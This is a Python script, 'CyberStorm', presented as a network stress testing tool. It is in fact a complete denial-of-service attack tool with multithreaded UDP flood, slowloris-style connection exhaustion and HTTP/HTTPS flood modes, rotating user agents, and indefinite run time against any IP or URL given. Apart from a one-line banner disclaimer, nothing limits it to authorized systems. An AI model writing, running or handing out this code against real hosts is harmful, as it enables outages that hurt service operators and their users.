import sys
import socket
import threading
import time
import random
import argparse
import ssl
from urllib.parse import urlparse
import requests
from concurrent.futures import ThreadPoolExecutor
import ipaddress
import signal
import os
import math
from datetime import datetime

class CyberStorm:
    def __init__(self):
        self.running = False
        self.attack_threads = []
        self.packets_sent = 0
        self.start_time = None
        self.last_stats_time = None
        self.target_ip = None
        self.target_port = None
        self.protocol = None
        self.thread_count = 50
        self.duration = 0  # 0 means infinite
        self.user_agents = []
        self.load_user_agents()
        self.verbose = False
        self.stats_interval = 5  # seconds
        self.exit_signal = False
        self.http_paths = [
            "/", "/wp-admin", "/admin", "/login", "/api/v1/test",
            "/images/logo.png", "/static/css/main.css", "/js/app.js"
        ]
        
        # Setup signal handler for graceful shutdown
        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)
        
    def load_user_agents(self):
        """Load common user agents for HTTP attacks"""
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36"
        ]
    
    def signal_handler(self, signum, frame):
        """Handle interrupt signals for graceful shutdown"""
        self.log("Received shutdown signal, stopping attacks...")
        self.exit_signal = True
        self.stop_attack()
    
    def validate_ip(self, ip_str):
        """Validate an IP address"""
        try:
            ipaddress.ip_address(ip_str)
            return True
        except ValueError:
            return False
    
    def validate_port(self, port):
        """Validate a port number"""
        try:
            port = int(port)
            return 1 <= port <= 65535
        except ValueError:
            return False
    
    def log(self, message, level="INFO"):
        """Log a message with timestamp"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        print(f"[{timestamp}] [{level}] {message}")
    
    def show_banner(self):
        """Display the tool banner"""
        banner = """
  ____      _              _____ _                  
 / ___|   _| |__  ___ _ __|_   _| |__   ___  _ __  
| |  | | | | '_ \/ _ \ '__| | | | '_ \ / _ \| '_ \ 
| |__| |_| | |_) |  __/ |    | | | | | | (_) | | | |
 \____\__, |_.__/ \___|_|    |_| |_| |_|\___/|_| |_|
      |___/                                          
        """
        print(banner)
        print("CyberStorm - Advanced Network Stress Testing Tool")
        print("Version 2.0 | Use responsibly and only on authorized systems")
        print("=" * 60)
        print()
    
    def show_help(self):
        """Display help information"""
        help_text = """
Usage:
  python cyberstorm.py [options]

Options:
  -t, --target      Target IP address or URL (required)
  -p, --port        Target port (required for UDP/TCP attacks)
  --protocol        Attack protocol (http, https, udp, lowband) [default: http]
  --threads         Number of concurrent threads [default: 50]
  --duration        Attack duration in seconds (0 for infinite) [default: 0]
  -v, --verbose     Show verbose output
  --help            Show this help message

Examples:
  HTTP flood:    python cyberstorm.py -t http://example.com --threads 100
  HTTPS flood:   python cyberstorm.py -t https://example.com --protocol https
  UDP flood:     python cyberstorm.py -t 192.168.1.100 -p 53 --protocol udp
  Low bandwidth: python cyberstorm.py -t 192.168.1.100 -p 80 --protocol lowband --duration 300
"""
        print(help_text)
    
    def parse_arguments(self):
        """Parse command line arguments"""
        parser = argparse.ArgumentParser(description="CyberStorm Network Stress Testing Tool", add_help=False)
        parser.add_argument("-t", "--target", help="Target IP address or URL")
        parser.add_argument("-p", "--port", type=int, help="Target port number")
        parser.add_argument("--protocol", choices=["http", "https", "udp", "lowband"], default="http", help="Attack protocol")
        parser.add_argument("--threads", type=int, default=50, help="Number of concurrent threads")
        parser.add_argument("--duration", type=int, default=0, help="Attack duration in seconds (0 for infinite)")
        parser.add_argument("-v", "--verbose", action="store_true", help="Show verbose output")
        parser.add_argument("--help", action="store_true", help="Show help message")
        
        try:
            args = parser.parse_args()
            
            if args.help or not args.target:
                self.show_help()
                sys.exit(0)
                
            if args.protocol in ["udp", "lowband"] and not args.port:
                self.log("Port is required for UDP/low bandwidth attacks", "ERROR")
                self.show_help()
                sys.exit(1)
                
            # Parse target URL or IP
            if args.target.startswith(("http://", "https://")):
                parsed = urlparse(args.target)
                self.target_ip = parsed.hostname
                if parsed.port:
                    self.target_port = parsed.port
                elif parsed.scheme == "http":
                    self.target_port = 80
                else:
                    self.target_port = 443
                args.protocol = parsed.scheme
            else:
                if not self.validate_ip(args.target):
                    self.log(f"Invalid IP address: {args.target}", "ERROR")
                    sys.exit(1)
                self.target_ip = args.target
                self.target_port = args.port
                
            self.protocol = args.protocol
            self.thread_count = args.threads
            self.duration = args.duration
            self.verbose = args.verbose
            
        except Exception as e:
            self.log(f"Argument error: {str(e)}", "ERROR")
            self.show_help()
            sys.exit(1)
    
    def print_stats(self):
        """Print attack statistics"""
        if not self.start_time:
            return
            
        current_time = time.time()
        elapsed = current_time - self.start_time
        packets_per_sec = self.packets_sent / elapsed if elapsed > 0 else 0
        
        self.log(f"Attack running for {elapsed:.1f} seconds")
        self.log(f"Total packets sent: {self.packets_sent}")
        self.log(f"Packets per second: {packets_per_sec:.1f}")
        self.log(f"Active threads: {threading.active_count() - 1}")  # Subtract main thread
        print()
    
    def stats_loop(self):
        """Periodically print statistics"""
        while self.running and not self.exit_signal:
            self.print_stats()
            time.sleep(self.stats_interval)
    
    def udp_flood(self):
        """Perform UDP flood attack"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            
            # Generate random payload (32 bytes to 1024 bytes)
            payload = os.urandom(random.randint(32, 1024))
            
            while self.running and not self.exit_signal:
                try:
                    sock.sendto(payload, (self.target_ip, self.target_port))
                    self.packets_sent += 1
                    
                    if self.verbose and self.packets_sent % 100 == 0:
                        self.log(f"Sent {self.packets_sent} UDP packets to {self.target_ip}:{self.target_port}")
                    
                    # Small delay to avoid complete CPU saturation
                    time.sleep(0.001)
                    
                except Exception as e:
                    self.log(f"UDP send error: {str(e)}", "ERROR")
                    time.sleep(1)  # Wait before retrying
                    
        finally:
            if 'sock' in locals():
                sock.close()
    
    def low_bandwidth(self):
        """Perform low bandwidth attack (slowloris style)"""
        try:
            while self.running and not self.exit_signal:
                try:
                    # Create a new connection
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(10)
                    s.connect((self.target_ip, self.target_port))
                    
                    # Send partial HTTP request
                    s.send(f"GET /{random.choice(self.http_paths)} HTTP/1.1\r\n".encode())
                    s.send(f"Host: {self.target_ip}\r\n".encode())
                    s.send("User-Agent: {}\r\n".format(random.choice(self.user_agents)).encode())
                    s.send("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n".encode())
                    s.send("Accept-Language: en-US,en;q=0.5\r\n".encode())
                    s.send("Connection: keep-alive\r\n".encode())
                    
                    self.packets_sent += 1
                    
                    if self.verbose:
                        self.log(f"Initiated low bandwidth connection #{self.packets_sent}")
                    
                    # Keep connection alive by sending headers periodically
                    while self.running and not self.exit_signal:
                        try:
                            s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode())
                            time.sleep(random.uniform(5, 15))
                        except:
                            break
                            
                except Exception as e:
                    if self.verbose:
                        self.log(f"Low bandwidth error: {str(e)}", "ERROR")
                    time.sleep(1)
                    
                finally:
                    if 's' in locals():
                        try:
                            s.close()
                        except:
                            pass
        except KeyboardInterrupt:
            pass
    
    def http_flood(self, use_https=False):
        """Perform HTTP/HTTPS flood attack"""
        session = requests.Session()
        if use_https:
            session.verify = False  # Ignore SSL errors
            requests.packages.urllib3.disable_warnings()
            
        url = f"{'https' if use_https else 'http'}://{self.target_ip}"
        if self.target_port not in [80, 443]:
            url += f":{self.target_port}"
            
        headers = {
            'User-Agent': random.choice(self.user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache'
        }
        
        while self.running and not self.exit_signal:
            try:
                path = random.choice(self.http_paths)
                full_url = f"{url}{path}"
                
                # Randomly choose between GET and POST
                if random.random() > 0.7:
                    # POST request with random data
                    data = {'random': str(random.randint(1, 100000))}
                    response = session.post(full_url, headers=headers, data=data, timeout=5, verify=False)
                else:
                    # GET request
                    response = session.get(full_url, headers=headers, timeout=5, verify=False)
                
                self.packets_sent += 1
                
                if self.verbose and self.packets_sent % 100 == 0:
                    self.log(f"Sent {self.packets_sent} HTTP{'S' if use_https else ''} requests to {full_url}")
                
            except Exception as e:
                if self.verbose:
                    self.log(f"HTTP{'S' if use_https else ''} error: {str(e)}", "ERROR")
                time.sleep(0.1)
    
    def start_attack(self):
        """Start the selected attack"""
        self.running = True
        self.start_time = time.time()
        self.last_stats_time = self.start_time
        self.packets_sent = 0
        
        self.log(f"Starting {self.protocol.upper()} attack on {self.target_ip}" + 
               (f":{self.target_port}" if self.target_port else ""))
        self.log(f"Using {self.thread_count} threads for {'infinite' if self.duration == 0 else self.duration} seconds")
        
        # Start stats thread
        threading.Thread(target=self.stats_loop, daemon=True).start()
        
        # Start attack threads
        with ThreadPoolExecutor(max_workers=self.thread_count) as executor:
            for _ in range(self.thread_count):
                if self.protocol == "udp":
                    self.attack_threads.append(executor.submit(self.udp_flood))
                elif self.protocol == "lowband":
                    self.attack_threads.append(executor.submit(self.low_bandwidth))
                elif self.protocol == "https":
                    self.attack_threads.append(executor.submit(self.http_flood, True))
                else:  # http
                    self.attack_threads.append(executor.submit(self.http_flood, False))
            
            # Wait for duration or until interrupted
            if self.duration > 0:
                time.sleep(self.duration)
                self.stop_attack()
            else:
                while self.running and not self.exit_signal:
                    time.sleep(1)
    
    def stop_attack(self):
        """Stop the running attack"""
        if not self.running:
            return
            
        self.running = False
        self.log("Stopping attack...")
        
        # Wait for threads to finish
        for thread in self.attack_threads:
            try:
                thread.result(timeout=5)
            except:
                pass
                
        # Print final stats
        self.print_stats()
        elapsed = time.time() - self.start_time
        self.log(f"Attack completed in {elapsed:.1f} seconds")
        self.log(f"Total packets sent: {self.packets_sent}")
        self.log(f"Average packets per second: {self.packets_sent / elapsed:.1f}")
    
    def run(self):
        """Run the tool"""
        self.show_banner()
        self.parse_arguments()
        self.start_attack()

if __name__ == "__main__":
    tool = CyberStorm()
    tool.run()